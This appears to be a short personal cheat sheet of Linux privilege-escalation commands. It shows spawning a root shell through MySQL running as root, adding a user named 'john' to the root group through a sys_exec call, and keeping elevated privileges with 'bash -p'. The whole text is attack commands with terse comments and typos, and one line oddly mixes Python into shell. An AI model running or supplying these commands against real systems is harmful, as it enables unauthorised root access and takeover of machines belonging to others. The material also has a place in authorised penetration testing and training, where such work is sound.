#if mysql is running as root 
#then run system command 
mysql -h localhost -u root -p
mysql>system sudo /bin/bash
or
select sys_exec('usermod -a -G root john');
#add user to thr group


echo os.system('/bin/bash')


#to get bash as same privilage as program
bash -p
#preserve same privilage

